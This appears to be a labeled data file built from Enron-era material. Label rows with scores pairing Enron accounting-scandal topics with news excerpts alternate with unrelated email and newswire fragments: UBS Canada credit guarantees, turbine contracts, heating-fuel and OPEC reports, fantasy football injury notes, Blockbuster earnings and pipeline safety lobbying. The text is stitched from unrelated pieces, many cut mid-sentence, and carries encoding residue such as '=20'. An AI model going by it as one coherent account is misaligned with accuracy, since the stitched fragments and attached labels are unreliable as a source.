it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,1,"While acknowledging Enron's unique equity-based compensation program, Dietert says recent selling at the top is unique. ""You constantly see a regular group of people selling as they monetize their compensation"" at Enron, he says. ""However, the larger sales from senior executives are different. Sales have been weighted much more heavily to Lay and Skilling than they have been in the past."" Dietert's 12-month price for Enron is $58, and his firm has not provided banking services to Enron. Simmons does not rate companies. Another analyst who asked not to be named was more critical. ""The [insider sales] are disconcerting to say the least. In a market like this where the slightest indication of lack of confidence sends a stock down precipitously, their actions are speaking louder than their words."" Dream vs. RealityOne reason for the mixed messages may have been the company's belief in broadband. At the time Skilling made his now famous $126 tout, he indicated that nearly $40 of value would come from Enron's now flailing broadband business. As my colleagues Adam Lashinsky </comment/siliconstreet/1489696.html> and Peter Eavis </comment/detox/1489630.html> have aptly chronicled, Enron's great dream for broadband turned into a nightmare. ""The world certainly looks a lot different today than it did in January, especially to Enron,"" says Tom McIntyre, president of Dessauer & McIntyre Asset Management, a Massachusetts-based investment adviser. ""You sure don't see projections from anyone assigning value to broadband now."" In fact, on Enron's second-quarter earnings call, Skilling lamented the fact that investors seem to be assigning negative value to the company's telecom operations. McIntyre holds a long position in Enron. Still, investors might have expected Skilling's words to be backed by his actions. When he made the bullish comments in January, Skilling was selling stock even though the shares were trading near $80 a share, a 57% discount to his target price. That led the analyst to quip, ""If it's not an expensive stock, why are they out there selling it?"" To others, however, the sales are just noise that distracts from a solid growth story. ""You would prefer it if they would never sell,"" says McIntyre. ""I'd rather watch them hold the shares like I do. However, [Skilling] still owns well over a million shares, and the consistent sales suggest they have a program to sell whether the stock is near its high or at its lows."" (Records show that Skilling has been selling 10,000 shares each week since mid-November.) The two executives ""have a long record of creating and sustaining value for shareholders. I have a high level of confidence that Skilling can continue that record,"" McIntyre said. But appearances count. ""It's a question of perceptions,"" says McIntyre. ""In this market, anything can get a company, and the insider-sales news does hurt.""",0.3,0.0,0.9,0.2

 Just to add to Peter's comments - the fundamental premise of the UBS transaction would be the backing of the double A+ balance sheet as the contracting party. To think that counterparties will accept a parental guarantee is unrealistic.

 -----Original Message-----
Subject:	RE: Please help

To clarify:

1.  The guarantee issue is already in play with the Canadian pipelines, power pools, office landlords, etc. and will be an impediment to closing and/or commencing business operations;

2.  It is not that counterparties will be unlikely to transact with this new UBSW Canadian entity without credit support ... they will not;

3.  Although parental g'ee of UBS AG as credit support will help, the structure of a non-creditworthy sub supported by a parental g'ee (with its own terms, conditions and limits) is the old Enron structure, and it may well not be well received in the industry.

Peter.

 -----Original Message-----
Subject:	Please help

Canada appears to be an issue.

We need to make swift progress on this - unlike in the US the contracting entity with our counterparties will not be UBS AG, London Division but UBS Warburg Energy (Canada) Ltd.  With the lack of parental company guarantees forth coming from UBS, this is going to be an issue.

There are two main points, because of our current history our customers will not contract lightly with a subsidiary with no guarantee and secondly the credit group are asking for guarantees from our customers.

Please let me know how we can progress on this.

The Purchaser (WestLB) under the Turbine Purchase Agreement (the ""Turbine Contract"") may assign a portion of its rights and obligations under the Turbine Contract to an affiliate of ENA without the Seller's consent. Kay has structured the Turbine Contract to allow the assignee to enter into separate purchase agreements with GE Packaged Power for the equipment being assigned. The documents to transfer title of the equipment from WestLB (in the case of equipment that is already fabricated) and to replace ENA with another business unit on the purchase agreement should be prepared by the business unit attorneys involved in the transfer, based on a form of contract which is very similiar to the Master Purchase Agreement. (Rose - the assignee/new owner needs to step into the turbine contract even if title has passed to WestLB, as there are lots of rights (warranty, indemnity) the new owner needs to have.

World Heating Fuel Projections 
 

    The eastern half of the US will continue to experience colder 
weather for the next several days resulting in strong heating fuel 
consumption. Temperatures are expected to be 8 to 16 degrees below 
average from the central Plains to the mid-Atlantic region southward 
to the Gulf of Mexico. New England, the upper Midwest and the 
northern Plains will be a little milder than normal, but heating fuel 
demand will remain higher than usual. Mild weather is expected 
throughout the western states decreasing demand for heating fuel. In 
Canada, above normal temperatures into early January will keep 
heating fuel consumption lower than normal. A cool-weather bias will 
remain in far southeastern Canada for the several days producing 
above normal demand for heating fuels. Milder weather in western 
Europe will significantly reduce heating fuel consumption during the 
next 7 to 10 days. In the UK and France, temperatures will be close 
to normal through January 5th. Germany and eastern Europe will 
experience colder temperatures, but some reduction in heating fuels 
demand will occur. Temperatures in Scandinavia will average from 4 to 
8 degrees Celsius below normal producing strong heating oil 
consumption through early January. China's weather will continue to 
be colder than usual, with temperatures expected to average from 4 to 
8 degrees Celsius below normal for the next 10 days. Japans usage of 
heating fuel is projected to higher than normal through January 5th. 
Most of the country will be 2 to 5 degrees Celsius below average.

Earlier, NBER said that the 10-year U.S. economic expansion officially ended in March of this year and a recession has officially ensued. Uplifting comments from St. Louis Federal Reserve Bank President William Poole that the U.S. is starting to display signs of a recovery did little to stem the upward momentum in Treasuries, despite Poole's reference to rising equity prices, a firming housing market, and stronger retail sales.----------------------------------------------------------------WORLD MARKETSEuropean markets are mixed late in the session, shedding earlier gains as U.S. markets meandered in and out of positive territory. The Bloomberg European 500 index is down 0.07% as of best-performing issues, while energy stocks are pacing the decliners. Nokia (NOK,25,f2) and Ericsson (ERICY,5.74,f1) shares were higher after Morgan Stanley increased its forecast for worldwide wireless phone unit sales by 5.4% to 390 million phones in 2001 and by 3.6% to 435 million phones in 2002. In other equity news, Deutsche Lufthansa AG's (DLAKY,14.00) CEO said that he sees ""no signs of recovery"" in passenger traffic, though he does anticipate an eventual pick up in demand. The euro remained in positive territory against the dollar but retreated from earlier highs.

These changes arecomprehensive and include the introduction of fair value --ormark-to-market--accounting. This last change, although seemingly innocuouswill be particularly powerful in its impact. But What Has All This To Do With Derivatives? The introduction of mark-to-market accounting requires listed Japanesecompanies to record their holding of marketable property assets andsecurities at current market value rather than at book value. This meansthat balance sheets will no longer be buttressed by assets valued atinflated bubble economy levels. But most crucially profit streams willbecome exposed to movements in equity markets, as the definition ofsecurities includes the cross shareholdings which bind members of Japan'sKeiretsu and other business groupings. These are substantial in Japan,accounting for perhaps 40% of all shareholdings. The unwinding of cross shareholdings is undoubtedly one of the factorsbehind the recent weakness of Tokyo stock prices, not least as foreignbuyers who had been soaking up much of the unwound cross held shares comingonto to the market have been notably absent over the past few months. Hence there has been much talk about how best to unwind these crossshareholdings without further depressing the market. Where possible firmswith mutual shareholdings have been seeking arrangements that areeffectively straight swaps. But derivatives can also play their part. Many corporates with large shareholding disposal programmes have beenactively seeking to hedge their equity exposure as they embark on theirshare sale process. Often they have effected this through the use of calloptions. Thus if the market falls they have at least benefited from thepremium earned at the time of the sale of the call option and if the marketrises and the option is called by the purchaser then the shares have beensuccessfully disposed of, but without further dampening an already weakmarket.",0.0,0.0,0.7,0.2

Subject: PG&E Gas Accord II Settlement Proposal


Confidential Settlement Document
Per CPUC Rule 51

Gas Accord II Settlement Participants:


Attached is PG&E's Gas Accord II (GA II) Settlement Proposal.  We believe it
addresses many of the issues and concerns you have raised in the workshops.


As an overview, this proposal:

* Maintains the basic Gas Accord structure in place today for the
period 2003 to 2007.
*
* Offers end user transportation rates for 2003 lower for most
customers than rates in effect today.
*
* Provides for vintaged Redwood path rates for core customers.
*
* Offers a 7.5 cent/dth rate to large customers while minimizing rate
changes to other customers, minimizing the incentive for these customers to
seek to bypass local transmission charges and other CPUC-approved charges.
*
* Adopts guidelines to improve reliability and help moderate prices in
gas commodity markets, and identifies the capital projects needed to meet
these guidelines over the course of the GA II period (2003-2007).
*
* Provides a high degree of rate stability, with a 3.5% escalator to
capture both inflation and the cost of needed capital projects.  The
guaranteed rates will be adjustable only for significant changes in the cost
of capital or increased costs due to governmental requirements or
catastrophic events.
*
* Preserves a rate differential between the Redwood and Baja paths,
although somewhat less than the current differential.
*
* Proposes a two-stage open season for firm transportation services
beginning in 2003, with end users receiving a first option on available
capacity.
*
* Maintains the core aggregation program with some adjustments.

PG&E also anticipates that the Core Procurement Incentive Mechanism (CPIM)
will be similar to today's mechanism, but will reflect the somewhat larger
capacity holdings needed to meet anticipated increases in core demand and to
meet a 1-day in 10-year cold weather event.

This also will serve as a reminder that an all-Party meeting is scheduled at

it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,0,"Berkeley, California, Jan. 24 (Bloomberg) -- One of the high points of my day is reading the mail I receive from current and former Enron Corp. employees. If you are in the middle of a big media story and have some feel for its nuances, the coverage of that story always seems ridiculously inadequate. A lot of Enron's employees seem to feel the press doesn't fully understand what has happened to them. At any rate, a number of Old Enronians have felt compelled to call or write to me. Thanks to them I know that the now notorious Raptor partnership, into which Enron's top executives stuffed many bad investments, got its name because raptors ate garbage. Thanks to them I understand that the documents Arthur Andersen shredded were probably butt-covering memos from junior accountants to their bosses that spelled out the tacit understanding between the junior accountants and Enron that enabled Arthur Andersen to turn a blind eye to Enron's deceits. Thanks to them I know that Jeffrey Skilling was widely regarded as the shrewdest of the top executives and, by resigning for ``personal reasons,'' signaled to everyone else that Enron was doomed. But these letters from Enron's employees -- especially the ones from people still working at Enron -- are frustrating, because they usually come with a request that I avoid contacting them for further discussion. They don't want to be famous, just understood.Unanswered Questions With no one on the inside to quiz, I still don't understand the story as it demands to be understood. Big questions remain about Enron, including: 1) Why did Enron make so many really stupid investments? At the heart of the company's problems were a lot of inexplicable purchases of Indian power plants and Brazilian pipelines and so on. As one especially acute Enron correspondent put it, ``it really takes a ton of people to flush billions down the toilet. Popular wisdom would have us believe that it was just a few bad apples at the top (but) at the very least hundreds of employees knew about a couple of bad deals they worked on. Why weren't they wondering who was making all the money?'' Enron's investment decisions were so colossally inept as to suggest an ulterior motive.

I am working with UC's attorney to see if they will join.
Our strategy is similar if the Legislature enacts a law with a retroactive date.  The major differences are that we would go directly to court and we would have to wait until the bill was signed by the Governor. Some of our ESP and customer friends would likely drop off at that point, because they have less financial harm from an Aug 25 date.

Brunell is questionable for Monday's game against Green Bay, the third straight week his status has been in question due to continued pain in his quadriceps muscle. He will be limited again in practice, and it's probably a good idea to keep him on reserve for Week 12 in your league.

Terrell Davis <http://football222.fantasy.sportsline.com/mp/elink?script=players&league=bige01&owner=14696.2&random=1504&key=1097&>, RB DEN - JWillie Updated 11/27/01
Davis should be able to return from arthroscopic knee surgery in time for Sunday's game agains! t ! Miami. He will practice this week before a final decision is made, but we're skeptical the Broncos won't have him split carries with Mike Anderson, limiting both players' Fantasy values.

Poole has bruised ribs that will likely keep him on the sidelines for Sunday's game against Miami. If he can't play, Kevin Kaspar would start in his place, and the Denver passing game would further suffer.

Rod Smith <http://football222.fantasy.sportsline.com/mp/elink?script=players&league=bige01&owner=14696.2&random=1504&key=1220&>, WR DEN - Matty Updated 11/27/01
Smith now has two sprained ankles, and is questionable for Sunday's game against Miami. If he can't play, then the Broncos might have to start Kevin Kaspar and Chris Cole at wideout, depending on Keith Poole's recovery from a rib injury.

James Jackson <http://football222.fantasy.sportsline.com/mp/elink?script=players&league=bige01&owner=14696.2&random=1504&key=235220&>, RB CLE - Hunter Updated 11/27/01

The Dallas-based company's net loss was $24.6 million, or 14 cents a share, in the period ended Dec. 31, compared with a net loss of $6.8 million, or 4 cents, last year, the company said Tuesday.Excluding goodwill amortization, earnings of 22 cents a share were up 10 percent from last year and exceeded estimates. Wall Street analysts had expected cash earnings of 20 cents a share, according to a survey by First Call/Thomson Financial. The amortization of almost $6 billion in good will was left over on Blockbuster's balance sheet from 1994, when Viacom bought the company. Blockbuster is a publicly traded subsidiary of entertainment giant Viacom Inc., which owns 80 percent of the chain. John Antioco, Blockbuster's chairman and chief executive officer, said the company's market share increased last year to 36 percent of U.S. video rentals, up from 32 percent in 1999. The company is poised to end this year at 40 percent, he said. Total revenue was up 12.1 percent to $1.34 billion in the fourth quarter from $1.20 billion last year. Same-store sales increased 7 percent. Blockbuster also said it has sold more than 100,000 DirecTV Systems since September. In June, Blockbuster will begin co-branding DirecTV's pay-per-view service, Mr. Antioco said. The company also said that Blockbuster's video on demand tests are under way with an Enron Corp. subsidiary in Seattle, Portland, New York and a Salt Lake City suburb. This year, Blockbuster said, it plans to open 200 to 250 company-owned stores, about half the number of stores it opened last year. It plans fewer stores because competitors have slowed store growth. Blockbuster operates 7,700 stores throughout the United States, Europe, Asia and Australia. The company's stock price gained 4 cents a share to close at $11.72 on the New York Stock Exchange.NEWSDEMAND A DEAL Blockbuster pacts for PPV, VOD rights to U pixPAUL SWEETING02/14/2001Daily Variety 6Copyright 2001 Variety, Inc.

Increased financial disclosure is the critical issue for the industry, not mark-to-market itself. Accrual accounting for energy trading contracts, which has been replaced by mark-to-market in most circumstances, provides more opportunities for fraud, manipulation and deception. --------------------------------------------------------------POWER FUTURES ?| Month | COB | Change | PV | Change || MAR | 20.00 | +0.00 | 22.50 | +0.00 || APR | 20.25 | +0.00 | 24.00 | +0.00 || MAY | 19.75 | +0.00 | 25.00 | +0.00 || JUN | 21.00 | +0.00 | 28.50 | +0.00 || JUL | 28.75 | +0.50 | 39.75 | +0.00 || AUG | 37.50 | +0.00 | 45.25 | +0.00 || SEP | 33.50 | +0.00 | 34.50 | +0.00 || OCT | 29.50 | +0.00 | 29.50 | +0.00 || NOV | 29.00 | +0.00 | 28.50 | +0.00 || DEC | 30.50 | +0.00 | 29.00 | +0.00 || JAN | 30.50 | +0.00 | 29.50 | +0.00 || FEB | 29.00 | +0.00 | 29.00 | +0.00 || Month | Entergy | Change | Cinergy | Change || MAR | 20.00 | +0.00 | 21.10 | +0.00 || APR | 20.00 | +0.00 | 21.60 | +0.00 || MAY | 22.50 | +0.00 | 24.70 | +0.00 || JUN | 27.50 | +0.00 | 30.00 | +0.00 || JUL | 34.50 | +0.00 | 38.25 | +0.00 || AUG | 34.50 | +0.00 | 38.25 | +0.00 || SEP | 21.50 | +0.00 | 22.90 | +0.00 || OCT | 21.85 | +0.00 | 22.90 | +0.00 || NOV | 21.85 | +0.00 | 22.90 | +0.00 || DEC | 21.85 | +0.00 | 22.90 | +0.00 || JAN | 24.10 | +0.00 | 25.90 | +0.00 || FEB | 24.10 | +0.00 | 25.90 | +0.00 |------------------------------------------------------------Power Futures | Month | PJM | Change || MAR | 25.10 | +0.00 || APR | 25.10 | +0.00 || MAY | 28.25 | +0.00 || JUN | 35.00 | +0.00 || JUL | 46.15 | +0.00 || AUG | 46.15 | +0.00 || SEP | 27.15 | +0.00 || OCT | 26.00 | +0.00 || NOV | 26.00 | +0.00 || DEC | 26.00 | +0.00 || JAN | 30.25 | +0.00 || FEB | 30.25 | +0.00 |-------------------------------------------------------------Marketers Say Derivative Bill Goes to Far",0.0,0.0,0.5,0.2
record keeping accounting practices,0,"Subject: RE: Azurix General Ledger - statusRod,We get one template from each operating company at a specified level in the ownership chain. This template contains the minimum number of accounts necessary in order to achieve our external reporting requirements. For example, an operating company will submit a template with only one G&A account. However, they will report interest expense gross of capitalized interest since we disclose our capitalized interest in a footnote. Any intercompany accounts which get eliminated in consolidation are detailed out. The templates are manually entered into Oracle.Most of the Cayco's and BV companies which sit above the operating companies only have equity earnings and interest expense/income type entries and those are accounted for here. Azurix Corp. has more detail type entries but these are primarily G&A, DD&A, intercompany billings and equity earnings.KennyKenny, correct me if I am wrong, but I think you are using the oracle system in a similar manner. Data actually comes out of many systems and you input that data into oracle to help prepare financials.

it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,1,"Derivatives at Root of Enron Collapse Enron's extensive use of derivatives, not just its accountingpractices, lie at the root of its fall into bankruptcy. Enron had usedprofits from its derivatives trading operation, which was littleunderstood by investors, to mask losses in its more visible businesseseven as some of its employees may have been fraudulently manipulatingthose profits. Enron reaped huge profits from derivatives. But it lostbillions on most everything else it did, including projects in fiber-opticbandwidth, retail natural gas and power, water systems and technologystocks, but used its expertise in derivatives to hide these losses.Derivatives are complex financial contracts whose values are linked tounderlying variables such as the prices of commodities, stocks or bonds.They are used by sophisticated investors to manage risk. Enron's use ofderivatives both outside and inside the company can likely be directlylinked to its collapse. On the outside, they were used to create thecompany's web of off-balance sheet deals with complex financialpartnerships known as special-purpose vehicles. After some of those dealswent sour, Enron in October took a $1 billion charge against earnings anda $1.2 billion write-down in shareholder equity, triggering its nosediveinto bankruptcy. But Enron's derivatives problems ran far deeper than theoutside special purpose vehicles.

record keeping accounting practices,1,"Enron's accounting firm, Andersen, has admitted its employees disposedof or deleted a number of documents related to its audit of Enron.Andersen, which has come under fire from investors and lawmakers forsigning off on Enron's books, said it had notified the SEC, the JusticeDepartment and congressional committees and other agencies investigatingEnron's collapse. In recent months individuals in the accounting firminvolved with the Enron engagement disposed of a significant butundetermined number of electronic and paper documents and correspondencerelating to the Enron engagement. The SEC's enforcement chief says thatthe destruction of documents was an extremely serious matter. In testimonybefore Congress last month, Andersen CEO said it had warned Enron ofpossible illegal acts, but said it had failed to provide the auditor withkey information.

it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,1,"One of the mysteries of Enron Corp.'s fall from grace is how an audit commi=ttee chock full of talent could have been blind to the company's financial =sleight of hand. So far, speculation has centered around the apparent failu=re of Enron's auditors, Arthur Andersen LLP, to alert the audit committee t=o the problem until very late in the game. But the truth is, the audit comm=ittee deserves much of the blame for Enron's collapse--and the corporate go=vernance movement deserves much of the blame for the Enron audit committee.==20Whatever its flaws, the committee followed all the rules laid down by feder=al regulators, stock exchanges, and governance experts regarding director p=ay, independence, disclosure, and financial expertise. Enron collapsed in l=arge part because the rules didn't accomplish what the experts hoped they w=ould. For example: -- Paying directors with stock may have aligned their in=terests with shareholders', but it's just as likely to have created a motiv=e for not asking the tough questions. -- Disclosure rules may have alerted =investors to the fact that one audit committee member had a potential confl=ict of interest, but not that two others did as well. -- The Enron audit co=mmittee may have been exactly what the stock exchanges had in mind in Decem=ber, 1999, when they required that members demonstrate financial know-how--=but the expertise may have been out of date following the changes Enron wen=t through in the 1990s. In any case, it didn't help the committee make sens=e of Enron's tangled finances.Bottom line: It may be time to rethink the rules.=20Certainly there was nothing unusual about the Enron directors' heavy stock =ownership. Boards in general have bought into the argument by governance ex=perts that directors should get paid largely with stock to make sure they a=ct in the best interest of shareholders. Of the top 200 companies, 99% pay =directors with stock, up from 81% in 1995. And 62% of director pay comes in= equity, up from 24% in 1995, according to pay consultant Pearl Meyer & Par=tners.=20Clearly, stock is king. But should it be? Auditors are prohibited by the Se=curities & Exchange Commission from owning stock in client companies precis=ely because of its potential to corrupt. Yet audit committee members, like =all directors, are essentially required to own stock, presumably because it= keeps them honest. Three of the six audit committee members owned nearly 1=00,000 Enron shares worth a total of more than $7.5 million as of Feb. 15--=shares that surely would have plummeted in value had directors forced manag=ement to come clean about the risks of some of the company's off-balance-sh=eet partnerships.=20The committee's failure to force an earlier and more public explanation of =Enron's finances suggests to some that the shares, instead of making shareh=older interests the directors' top priority, did the opposite--in effect bu=",0.0,0.0,0.9,0.2

Including the charges, Lucent's loss widened to $2.59 per share. The company cited the elimination of jobs and some of its product lines for the charges. Going forward, Lucent anticipates a sequential fall in revenue in fiscal 1Q before a rise in fiscal 2Q sales.Leading U.S. oil company and Dow component Exxon Mobil (XOM,41,f2) posted 3Q earnings, excluding items, of $0.48 per share, below the First Call consensus of $0.50 per share on a 9.5% revenue decline amid softening demand and weaker crude prices. In a similar story, oilfield services company Schlumberger Ltd. (SLB,48,f2) reported 3Q earnings of $0.34 per share, $0.01 lower than the Street's mean forecast.Pharmaceutical titan Bristol-Myers Squibb (BMY,60,f2) posted 3Q earnings of $0.63 per share, in line with the First call consensus. Sales of the company's diabetes and blood-clotting drugs offset declining sales of its flagship cancer and anxiety medicines.Insurance and financial services company MetLife (MET,26) reported that it was eliminating roughly 1,900 jobs in a move to cut costs amid weakening conditions in the sector. The Snoopy and Charlie Brown purveyor also reduced its claims estimates associated with the Sept. 11 attacks to roughly $210 million, down from the previous forecast of $250 million to $300 million. The company expects 3Q operating profits of $0.29-$0.31 per share.Mobile-phone company AT&T Wireless (AWE,12.94,f2) said 3Q profits rose to $0.03 per share, well above the $0.02 per share loss expected by the Street. The company said that it added an additional 748,000 mobile customers during the quarter and sales rose 25%, but it plans to leave the fixed wireless business and take a related pretax 4Q charge.----------------------------------------------------------------TREASURY AND ECONOMIC SUMMARY Bonds were slightly lower as stocks were poised to open higher.

curbs already implemented this year by OPEC to grab a larger share of 
the market. The cartel had demanded that the non-member producing 
countries trim 500,000 bpd from exports before it would once again 
slice production. To date Russia, Mexico, Norway, Oman and Angola 
have pledged cuts totaling 462,500 bpd, which appears to be enough to 
convince OPEC to proceed with its cut. The ministers also seem to be 
comfortable with the level of commitment by the non-members to stick 
to their quotas for the specified 6-month period. The new 
restrictions will lower exports for 10 OPEC producers to 21.7 million 
bpd, down 5 million bpd or 19% from a year ago, the lowest level in 
10 years. Iraq, the 11th member produces at will because of UN 
sanctions. The new supply limits are designed to lift prices back to 
$20-$25 per barrel for the basket of OPEC crude oils.

RANDOM,0,"Subject: Forecast for MGT

At Third Current Estimate, we added a full year forecast for MGT for Operations and added the MGT and Border amounts together on the Border page in the ETS Functional Income Statement as instructed.

We are trying to confirm what we should be reflecting.  Jason is being instructed that ETS should not pick up any actuals for January through May, and that we should use Actuals received from El Paso for June forward, and not our numbers.  The El Paso amounts for June through September are close to what we have, but not exact.

Please advise us as to what we should be reflecting and we will revise our schedules.  We did not pick up MGT at all until 3rd CE, so I'm OK with restating 3rd CE to reflect the appropriate amounts for MGT and rolling forward from there.

here is a first cut at our problem statement for the pipeline safety
reauthorization bill
let me know what you think

Pipeline safety act reauthorization =0F- issues after the Senate markup

On June 15 the Senate Committee on Commerce Science and Transportation
unanimously reported S.2438, Senator McCain=0F's bill to amend the Pipeline
Safety Act.  Much of this bill is acceptable and would represent a
reasonable and even welcome resolution of issues raised since the petroleum
products pipeline accident in Bellingham Washington in June 1999.
Unfortunately however, the treatments accorded five specific issues by the
bill are so objectionable that unless changes in these areas can be made,
passage of the bill must be opposed.  This said, there is good reason to
believe that an aggressive effort can be successful in correcting the
treatment of these issues by opposing passage of the bill until changes are
made.

The bill and committee report are expected to be filed in the Senate after
the July 4th recess.  At that time we need to have in place commitments fro=
m
several Senators to withhold consent for consideration of the bill until
specific changes are made.  If the negotiations that could be expected to
follow communication of these holds to Sen.Gorton, Sen. McCain and the
Majority Leaders yield an acceptable amended bill, we would push hard for
passage and enactment of that bill.

 The changes that must be made to the bill in order to support passage are:

Mandatory reassignment of personnel  -- under section 13(b) an operator mus=

Enron, its political action committee and employees gavealmost $2.5 million to federal candidates and political partieslast year, with about 75 percent of the money going toRepublicans, according to campaign finance records. ``Enron is aligned with all the Texas energy exploration andproduction money,'' said Glenn Reynolds, an analyst atCreditSights Inc. ``They know how to do business.'' Risky Strategy In 1990, Lay hired Skilling, who became a force behind thecompany's growth. He ripped away walls in Enron's headquarters,built trading desks and transformed the company's regulatedpipeline and utility units into a business that some analysts sayresembles a hedge fund. Enron reported 1999 profit of $893 million and $40.1 billionin revenue. That same year, Enron expanded into water utilities,sewage treatment and trading space on fiber-optictelecommunication networks. Shareholder lawsuits filed in the pastmonth say those business were money losers from the start and thatexecutives mislead investors about them. A junior executive in Europe dreamed up an idea in 1999 foran Internet trading site dealing paper, plastics and othercommodities, in addition to the usual natural gas and electricityofferings. The site handled $50 billion in transactions in itsfirst six months and more than $880 billion in trades in twoyears, 60 percent of the company's total. ``Enron had a tremendous appetite for risk,'' said PeterFusaro, president of Global Change Associates, which didconsulting for Enron. ``They were the first in many markets, wouldtake long-term contracts, they were just super-aggressive. Theyhired Type-A MBA's from the best schools who learned the energybusiness from scratch.'' Investors in Dark Unknown by most investors, some of Enron's increased revenuewas coming from sales of power plants to Enron-affiliatedpartnerships. Those partnerships paid for the purchases by sellingbonds that were guaranteed by Enron. As a result, Enron's books showed an increase in cash fromthe sales, and a decrease in debt associated with the plants. AnEnron restatement of finances earlier this month showed that asmuch as $3.9 billion, or about a quarter of Enron's total longterm debt, had been shifted from Enron's books to affiliates. Skilling quit the company in August. Former Enron ChiefFinancial Officer Andrew Fastow was fired last month, after thecompany revealed that Fastow had personally profited fromtransactions he conducted with Enron partnerships.

According to the Detroit Free Press , Batch is expected to start Sunday's game against Chicago despite a groin injury. ""This is Charlie's offense,"" coach Marty Mornhinweg said. ""He practiced a little bit today...he was in all weekend getting (the injury) treated...I would expect him close to full speed Wednesday."" He'll likely lose snaps to rookie QB Mike McMahon, however, so starting Batch is a risky proposition.

Harris missed last week's game against Denver due to a hamstring injury. The veteran tight end is listed as day to day.

According to coach Dick Jaroun, Thomas' status for Week 12 is still uncertain. In fact, the Bears don't expect to know if Thomas, who is dealing with a hamstring injury, will be available until later in the week.

it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,1,"It appears that Enron was able to report profits from them, even though theunderlying assets included investments that declined in value. The WallStreet Journal, citing reports the partnerships made to institutionalinvestors, has reported the partnerships did well enough to make large cashdistributions to their investors. Enron officials in recent days haverefused to discuss the arrangements in any detail.One of the questions that the S.E.C. may look into is whether thetermination of those transactions should have been treated as a balancesheet item, or whether it should have been taken as a loss that affectedreported earnings. An S.E.C. spokesman declined to comment.Under accounting rules, a company's transactions in its own shares cannotproduce profits or losses, whatever the effect on cash flow. So a companythat sells its shares for $10 each, and buys them back at $50, or at $1,will report no earnings effect. Enron said that the reduction toshareholders equity, and a related reduction in notes receivable, ""is theresult of Enron's termination of previously recorded contractual obligationsto deliver Enron shares in future periods.""Stephen Moore, an analyst with Moody's Investors Service who has put Enron'sdebt on review for a possible downgrade, said that while some of the detailswere not clear, ""Essentially, Enron's promise was that a certain amount ofEnron's shares would be worth $1 billion. The shares plummeted, and theywere not"" worth that much.Enron emphasizes its own version of earnings, which leaves out someexpenses, and directs attention away from its balance sheet, which isdisclosed only in S.E.C. filings, not in the earnings news release. Thereduction in shareholders' equity would be shown only on the third-quarterbalance sheet, which has yet to be released.Earlier this year, Jeffrey Skilling, then Enron's chief executive, reactedstrongly when a questioner on a conference call challenged the failure toprovide balance sheet numbers when earnings were released. He called thequestioner a common vulgarity that surprised many listeners. Mr. Skillinglater resigned for what he said were personal reasons and Mr. Lay, thechairman and former chief executive, took back the latter title.While Enron was riding high, its often difficult-to-understand reports weregenerally seen as not being a problem. The company appeared to be thedominant force in the business of energy trading, and to be able to producephenomenal profits. When Mr. Lay was reported as having played an importantrole in formulating the Bush administration's energy policies, the aura wasonly enhanced.

quickly as possible - the longer the current situation persists the more 
money Enron will lose - whilst at the same time allowing us to weigh up the 
""cost - benefit"" analysis of all the various scenarios. 

Please note the following when planning our legal strategy:

- Enron Capital & Trade Resources Limited (""ECTRL"") (an English incorporated 
company) is our company which has entered into physical electricty sales 
contracts to supply certain Dutch Distribution Companies. The physical supply 
contracts are governed by Dutch law and are subject either to ICC arbitration 
in either Paris, Rotterdam or the Hague or the NAI in Rotterdam or the Hague 
(dependant upon the counterparty). 

- ECTRL is also a Participant on the APX.

- Enron Capital & Trade Resources International Corp. (""ECTRIC"") (a company 
incorporated  in Delaware, U.S.) is the Enron entity which, as principal, 
enters into financial swaps, arranged through Enron Europe Finance & Trading 
Limted (""EEFT"") (an English incorporated company which is regulated by the 
SFA),  with, among others,  Dutch Distribution companies.   The swap 
contracts have all been documented on a ""Deemed"" ISDA basis (representative 
confirms have already been sent to you on this aspect).

Clearly although the first three issues are ""TOP PRIORITY"", the Secondary 
Priority Issues are not far behind them and so we should be obliged to 
receive your consolidated written report on all the issues on or before 
Wednesday, 26th January, as we discussed yesterday.  When providing that 
report, please also let us have at the same time estimates of your fees for 
the whole of your team (incl. London and the US) (""ball-parks"" are fine at 
present) broken down into:

- fees for Clifford Chance's preliminary advice, including the written 
strategy report;

- fees for Clifford Chance prosecuting the Sep take-or-pay issues;

- fees for Clifford Chance prosecuting the APX issues;

- fees for Clifford Chance prosecuting any actions / defences / counterclaims 
on the swaps and / or physical contracts.

Fee estimates for Clifford Chance prosecuting any of the Secondary Priority 
issues can come later.
          
Please also pay particular attention to how we might obtain evidence to the 
appropriate standard of market rigging on the APX etc., conspiracy, etc, re 
defence / counterclaim to any non-payment by Enron on the Swaps (see Points 2

it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,1,"""To my knowledge, there is nothing that we have found that was illegal.""=20That was Joseph Berardino, CEO of Arthur Andersen, on Sunday's Meet the Pre=ss, trying to comfort viewers about the integrity of the audits his company= performed on the once-mighty energy firm, Enron. Enron's collapse, Berardi=no said, was a result of a bad business plan. ""It failed because the econom=ics didn't work.""Both statements may very well be true. But they're hardly reassuring. Quite= the opposite, in fact. The less illegality found in the Enron debacle, the= more chilling the picture becomes for investors.=20Just look at what Enron, often with the blessing of Andersen, managed to ac=complish, apparently within the comfortable confines of today's laws:=20* For nearly five years, Enron inflated earnings by a total of almost $600 =million. This ""legal"" practice forced investors to make decisions about the= value of Enron's stock using bogus profit figures.=20* Using off-the-books partnerships and maddeningly opaque accounting, with =Andersen's approval, Enron shielded about $500 million in debt. That helped= keep Enron's credit rating high, but at the expense of misleading anyone f=oolish enough to trust the numbers coming from the company and the private =credit-ratings agencies.=20To be sure, at least one high-level Enron official tried to do the right th=ing, raising concerns with Enron's CEO Kenneth Lay about the company's acco=unting practices. And some Andersen officials expressed concern about Enron='s now-famous ""partnerships"" and how Enron was crunching its numbers back i=n February 2001. Even some stock analysts openly puzzled over how Enron mad=e its money.=20But since everything looked legal on paper, those asking pointed questions =were ignored. On Sept. 26, Lay was urging employees to buy company shares, =telling them it was an ""incredible bargain"" and emphasizing that Andersen h=ad signed off on the off-the-books partnerships. Just 20 days later, Enron =announced a substantial third- quarter loss and a $1.2-billion drop in shar=eholder equity.=20Andersen continued to OK Enron's books. And stock analysts were busy toutin=g its stock right up to the bitter end. As late as 